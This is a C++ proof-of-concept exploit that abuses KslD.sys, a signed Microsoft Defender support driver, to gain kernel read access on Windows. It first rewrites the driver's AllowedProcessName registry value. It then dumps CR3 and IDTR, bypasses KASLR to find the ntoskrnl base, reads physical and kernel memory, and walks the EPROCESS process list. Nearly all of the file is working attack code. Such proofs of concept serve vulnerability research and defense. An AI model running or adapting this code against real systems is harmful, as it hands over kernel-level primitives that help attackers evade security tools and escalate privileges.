// KslD.sys PoC -- Microsoft WHQL-signed Defender support driver
//
// Demonstrates read-only kernel primitives:
//   1. CPU register dump (CR3, IDTR) via sub-command 2
//   2. KASLR bypass: IDTR -> IDT -> ISR -> ntoskrnl base
//   3. Physical memory read (BIOS shadow region 0xF0000)
//   4. Kernel VA read (ntoskrnl PE header)
//   5. PsInitialSystemProcess -> EPROCESS walk -> process list
//
// Build:  cl /EHsc /std:c++17 poc_ksld.cpp /Fe:poc_ksld.exe
//         g++ -std=c++17 poc_ksld.cpp -o poc_ksld.exe -lstdc++
//
// Requires: KslD.sys loaded + admin (for registry write to AllowedProcessName)
// Safety:   read-only driver, cannot write kernel memory or BSOD via IOCTLs

#include "wrappers/KslD.h"
#include <cstdio>

static void hexdump(const uint8_t* buf, size_t len, uint64_t base_addr) {
    for (size_t i = 0; i < len; i += 16) {
        printf("  %016llX  ", base_addr + i);
        for (size_t j = 0; j < 16 && i + j < len; j++)
            printf("%02X ", buf[i + j]);
        for (size_t j = i + 16 > len ? 16 - (len - i) : 0; j > 0; j--)
            printf("   ");
        printf(" ");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            uint8_t c = buf[i + j];
            printf("%c", c >= 0x20 && c < 0x7F ? c : '.');
        }
        printf("\n");
    }
}

int main() {
    printf("[*] KslD.sys PoC\n\n");

    // Step 0: set AllowedProcessName so the driver accepts our handle
    printf("[*] Setting AllowedProcessName registry value...\n");
    if (!ksld::SetAllowedProcess()) {
        printf("[-] Failed to set AllowedProcessName (need admin)\n");
        return 1;
    }
    printf("[+] Registry updated\n\n");

    ksld::Driver drv;
    if (!drv.Open()) {
        printf("[-] Failed to open \\\\.\\KslD (0x%08lX)\n", GetLastError());
        printf("    Is KslD.sys loaded? Try: sc start KslD\n");
        return 1;
    }
    printf("[+] Handle acquired\n\n");

    // Step 1: CPU register dump
    printf("[*] Sub-command 2: CPU register dump\n");
    uint64_t cr3 = 0, idtr = 0;
    if (drv.GetCpuRegisters(&cr3, &idtr)) {
        printf("[+] CR3  = 0x%016llX  (system page table base)\n", cr3);
        printf("[+] IDTR = 0x%016llX  (interrupt descriptor table)\n", idtr);
    } else {
        printf("[-] Register dump failed\n");
    }
    printf("\n");

    // Step 2: KASLR bypass
    printf("[*] KASLR bypass: IDTR -> IDT -> ISR scan -> ntoskrnl base\n");
    uint64_t ntos = drv.FindKernelBase();
    if (ntos) {
        printf("[+] ntoskrnl.exe base = 0x%016llX\n", ntos);
    } else {
        printf("[-] Kernel base not found\n");
    }
    printf("\n");

    // Step 3: Physical memory read -- BIOS shadow at 0xF0000
    printf("[*] Physical memory read: BIOS shadow region 0x000F0000\n");
    uint8_t bios[64]{};
    if (drv.ReadPhysical(0x000F0000, bios, sizeof(bios))) {
        hexdump(bios, sizeof(bios), 0x000F0000);
    } else {
        printf("[-] Physical read failed\n");
    }
    printf("\n");

    // Step 4: Kernel VA read -- ntoskrnl PE header
    if (ntos) {
        printf("[*] Kernel VA read: ntoskrnl PE header\n");
        uint8_t pe_hdr[64]{};
        if (drv.ReadKernelVA(ntos, pe_hdr, sizeof(pe_hdr))) {
            hexdump(pe_hdr, sizeof(pe_hdr), ntos);
            if (pe_hdr[0] == 'M' && pe_hdr[1] == 'Z')
                printf("[+] MZ signature confirmed at kernel base\n");
        } else {
            printf("[-] Kernel VA read failed\n");
        }
        printf("\n");

        // Step 5: resolve PsInitialSystemProcess and walk EPROCESS
        printf("[*] Resolving PsInitialSystemProcess export...\n");
        uint64_t psip = drv.FindExport(ntos, "PsInitialSystemProcess");
        if (psip) {
            printf("[+] PsInitialSystemProcess @ 0x%016llX\n", psip);

            uint64_t sys_ep = 0;
            drv.ReadKernelVA(psip, &sys_ep, 8);
            printf("[+] System EPROCESS      = 0x%016llX\n\n", sys_ep);

            if (sys_ep) {
                // Auto-detect PID/Links/Name offsets from System process
                uint8_t ep[0x800]{};
                drv.ReadKernelVA(sys_ep, ep, sizeof(ep));

                uint32_t off_pid = 0, off_links = 0, off_name = 0;
                for (uint32_t o = 0x100; o < 0x600; o += 8) {
                    uint64_t val;
                    memcpy(&val, ep + o, 8);
                    if (val == 4) {
                        uint64_t nxt;
                        memcpy(&nxt, ep + o + 8, 8);
                        if (nxt > 0xFFFF000000000000ULL) {
                            off_pid = o;
                            off_links = o + 8;
                            break;
                        }
                    }
                }
                for (uint32_t o = 0x200; o < 0x700; o++) {
                    if (memcmp(ep + o, "System\0", 7) == 0) {
                        off_name = o;
                        break;
                    }
                }

                if (off_pid && off_name) {
                    printf("[+] EPROCESS offsets: PID=0x%X  Links=0x%X  Name=0x%X\n\n",
                           off_pid, off_links, off_name);

                    printf("  %-6s %-20s %-18s\n", "PID", "Name", "EPROCESS");
                    printf("  %-6s %-20s %-18s\n", "------", "--------------------", "------------------");

                    uint64_t head = sys_ep + off_links;
                    uint64_t cur;
                    memcpy(&cur, ep + off_links, 8);

                    // Print System first
                    char name[16]{};
                    memcpy(name, ep + off_name, 15);
                    printf("  %-6u %-20s 0x%016llX\n", 4u, name, sys_ep);

                    int count = 1;
                    for (int i = 0; i < 200 && cur && cur != head; i++) {
                        uint64_t eproc = cur - off_links;
                        uint64_t pid = 0;
                        char pname[16]{};

                        drv.ReadKernelVA(eproc + off_pid, &pid, 8);
                        drv.ReadKernelVA(eproc + off_name, pname, 15);

                        printf("  %-6u %-20s 0x%016llX\n",
                               static_cast<unsigned>(pid), pname, eproc);
                        count++;

                        uint64_t next = 0;
                        drv.ReadKernelVA(cur, &next, 8);
                        cur = next;
                    }
                    printf("\n[+] %d processes enumerated via kernel read primitive\n", count);
                } else {
                    printf("[-] Could not auto-detect EPROCESS offsets\n");
                }
            }
        } else {
            printf("[-] Export resolution failed\n");
        }
    }

    printf("\n[*] Done. Driver handle closed on exit.\n");
    return 0;
}
